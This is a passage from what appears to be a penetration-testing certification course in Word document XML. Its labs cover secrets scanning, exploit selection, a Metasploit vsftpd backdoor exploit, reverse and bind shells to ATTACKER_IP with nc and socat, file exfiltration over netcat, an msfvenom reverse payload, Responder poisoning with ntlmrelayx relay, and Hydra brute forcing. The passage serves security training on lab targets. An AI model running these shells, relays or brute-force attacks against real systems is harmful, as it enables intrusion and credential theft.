        <w:t>Confirm both scanners report CVEs, Trivy flags the bad Dockerfile, and kube-hunter probes the Kubernetes API.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labs/lab-17-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 18 — Secrets Scanning with TruffleHog</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 2.2 Secrets enumeration (cloud keys, passwords, API keys, session tokens); 3.1 Secrets scanning..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner hunts secrets across Git history, filesystems, and Docker images with TruffleHog and Gitleaks, verifying live credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Verified secret findings mapped to CWE-798 with rotation and remediation guidance.   (Tools: TruffleHog, Gitleaks, jq, Docker, git.)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TruffleHog and Gitleaks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt install -y trufflehog gitleaks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan a public Git repo for verified secrets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trufflehog git https://github.com/dxa4481/truffleHog.git --only-verified</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Deep-scan every commit and branch of a repo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>git clone https://github.com/owasp/wstg.git; trufflehog git file://./wstg --no-update</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Get a second opinion with Gitleaks in SARIF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gitleaks detect --source ./wstg --report-format sarif --report-path gitleaks.sarif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan a Docker image for baked-in secrets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trufflehog docker --image nginx:1.18.0 --only-verified</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan a filesystem for secrets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo trufflehog filesystem /home --only-verified</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a custom org-specific detector</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trufflehog filesystem . --config custom.yaml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm --only-verified confirms live secrets and each finding is tied to CWE-798 with a rotation recommendation.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labs/lab-18-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 19 — Validating Findings and Public Exploit Selection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 3.2 Analyze output from recon/scanning phases (FP/FN, true positives, scan completeness); 4.1 Capability selection — tool/exploit selection..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner confirms true positives, eliminates false positives, and selects a safe public exploit using searchsploit and EPSS/KEV.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A validation log of true and false positives plus a vetted, reviewed exploit choice.   (Tools: searchsploit, Exploit-DB, Nmap, Metasploit, CISA KEV, EPSS.)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exploitdb and update searchsploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt install -y exploitdb; searchsploit --update</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Query Exploit-DB offline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>searchsploit vsftpd 2.3.4; searchsploit --cve 2017-0144</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Inspect an exploit before running it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>searchsploit -p 50704</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Mirror the exploit locally and hash it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>searchsploit -m 50704; sha256sum 50704.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Confirm an Nmap finding with a safe probe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -p445 --script smb-vuln-ms17-010 &lt;TARGET&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Verify with a non-destructive Metasploit aux module</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>msfconsole -q; use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS &lt;TARGET&gt;; run</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Prioritise an exploit by KEV, EPSS, and maturity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Build a validation log for the report appendix</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm each finding is labelled TP or FP with a documented, non-destructive validation method.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labs/lab-19-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Topic 04 — Attacks and Exploits  (35%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Metasploit · Responder/SMB Relay · Hydra · Hashcat · Priv-Esc · SQLi/XSS · Cloud · Wireless · Social Eng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The Metasploit Framework standardises exploitation: choose an exploit and a payload, set options, and gain a session; poisoning and relay (Responder, ntlmrelayx) capture and reuse credentials on the network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Password attacks split into online (Hydra, Medusa against live services) and offline (hashcat, John cracking captured hashes); privilege escalation on Linux (LinPEAS) and Windows (Kerberoasting) turns a foothold into full control.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Web attacks exploit injection and logic flaws — SQL injection (sqlmap), XSS/CSRF/SSRF (Burp Suite), and file inclusion / directory traversal leading to web shells.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The modern attack surface extends to cloud (S3/IAM with Pacu, ScoutSuite), wireless (WPA cracking with Aircrack-ng) and people (phishing with GoPhish and the Social-Engineer Toolkit).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 20 — Exploitation with the Metasploit Framework</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.1 Capability selection; 4.2 Network attacks with Metasploit; 4.10 Scripting and BAS..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner runs the msfconsole search-use-set-run workflow to exploit a vsftpd backdoor and land a root shell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A root shell on Metasploitable2 via the vsftpd 2.3.4 backdoor, plus a reusable resource script.   (Tools: Metasploit, msfconsole, msfvenom, meterpreter, msfdb, Docker.)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Spin up the Metasploitable2 target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name msf2 -p 21:21 -p 4444:4444 tleemcjr/metasploitable2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Initialise the database and launch msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo msfdb init; msfconsole -q</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Search for and select the vsftpd exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>search vsftpd 2.3.4; use exploit/unix/ftp/vsftpd_234_backdoor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Review the module details, references and rank</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Set the target host, port and payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>set RHOSTS 127.0.0.1; set RPORT 21; set PAYLOAD cmd/unix/interact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run the exploit and confirm a root shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Generate a matching meterpreter payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;your IP&gt; LPORT=4444 -f elf -o shell.elf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Automate the chained exploit with a resource script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>msfconsole -q -r pwn.rc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Running id in the obtained shell returns uid=0(root).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labs/lab-20-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 21 — Bind and Reverse Shells with Netcat and Socat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.1 Establish bind and reverse shells; 4.2 Command execution and shell handling; 4.4 Upgrade to a fully interactive TTY..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner catches a reverse shell and sets up a bind shell with Netcat, transfers files over the channel, builds an encrypted shell with ncat --ssl and socat, then stabilises a dumb shell into a fully interactive TTY with job control.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A working reverse shell, a bind shell, an encrypted socat/ncat channel and a stabilised interactive TTY.   (Tools: Netcat (nc/ncat), socat, Python, Kali.)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Confirm netcat and install ncat and socat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>which nc; sudo apt update &amp;&amp; sudo apt install -y ncat socat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Start a Netcat listener on the attacker host</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nc -lvnp 4444</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Catch a reverse shell dialled back from the target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># on target:  bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Set up a bind shell on the target and connect in</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># target:  nc -lvnp 5555 -e /bin/bash    |    attacker:  nc TARGET_IP 5555</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Transfer a file over the Netcat channel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># receiver:  nc -lvnp 6666 &gt; loot.tar    |    sender:  nc ATTACKER_IP 6666 &lt; loot.tar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Build an encrypted reverse shell with ncat --ssl</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ncat --ssl -lvnp 4443    # target:  ncat --ssl ATTACKER_IP 4443 -e /bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create an encrypted socat shell with a full PTY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>socat OPENSSL-LISTEN:4442,cert=server.pem,verify=0,fork -    # target:  socat OPENSSL:ATTACKER_IP:4442,verify=0 EXEC:'/bin/bash',pty,stderr</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Upgrade a dumb shell to a fully interactive TTY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>python3 -c 'import pty; pty.spawn("/bin/bash")'   # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm both the reverse and bind shells return remote command execution, the ncat/socat channel is encrypted, and the TTY upgrade yields a full interactive shell with working job control.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labs/lab-21-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 22 — LLMNR/NBT-NS Poisoning and SMB Relay with Responder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.2 On-path attack, Relay attack, Responder; 4.3 Pass-the-hash..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner poisons LLMNR/NBT-NS broadcasts with Responder to capture NetNTLMv2 hashes, then relays them with ntlmrelayx.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Captured NetNTLMv2 hashes and a relayed SMB authentication yielding remote code execution.   (Tools: Responder, impacket-ntlmrelayx, hashcat, crackmapexec.)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Run Responder to poison LLMNR/NBT-NS and answer WPAD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo responder -I eth0 -wf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Crack the captured NetNTLMv2 hash offline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Disable Responder's SMB/HTTP listeners for relaying</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nano /usr/share/responder/Responder.conf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate SMB hosts that lack signing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo crackmapexec smb 10.0.0.0/24 --gen-relay-list relay-targets.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Restart Responder in analyze/poison-only mode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo responder -I eth0 -A &amp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Relay the live authentication to a target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -c "powershell -enc &lt;base64&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Recommend LLMNR/NBT-NS and SMB-signing mitigations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ntlmrelayx replays a victim's authentication to a non-signed host and executes the payload as an admin.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labs/lab-22-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 23 — Online Password Attacks with Hydra and Medusa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.3 Dictionary, brute-force, password spraying, credential stuffing..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner performs online brute-force, spraying, and credential-stuffing attacks against live SSH, FTP, and HTTP services.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Recovered service credentials (msfadmin:msfadmin) from live SSH, FTP and web-form logins.   (Tools: Hydra, Medusa, cewl, crunch, Docker.)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Start the multi-service Metasploitable2 target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name msf2 -p 21:21 -p 22:22 -p 80:80 -p 445:445 tleemcjr/metasploitable2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Prepare a trimmed password wordlist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>head -1000 /usr/share/wordlists/rockyou.txt &gt; rockyou-1k.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Brute force SSH with Hydra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hydra -L users.txt -P rockyou-1k.txt -t 4 -f ssh://$TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Brute force FTP with Medusa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>medusa -h $TARGET -U users.txt -P rockyou-1k.txt -M ftp -t 5 -f</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Spray a single password low-and-slow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hydra -L users.txt -p 'Spring2026!' ssh://$TARGET -t 1 -W 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Attack a web login form</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
